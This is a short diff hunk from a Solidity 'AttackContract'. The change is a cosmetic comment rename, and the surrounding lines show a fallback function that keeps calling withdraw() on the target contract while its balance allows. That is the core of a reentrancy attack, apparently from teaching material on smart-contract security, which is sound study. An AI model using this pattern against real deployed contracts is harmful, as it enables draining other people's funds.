@@ -31,7 +31,7 @@ contract AttackContract {
         require(sent, "Failed to send Ether");
     }
 
-    // Fallback is called when EtherStore sends Ether to this contract.
+    // Fallback is called when EvilHackerWallet sends Ether to this contract.
     fallback() external payable {
         if (address(hackerWallet).balance >= AMOUNT) {
             hackerWallet.withdraw();
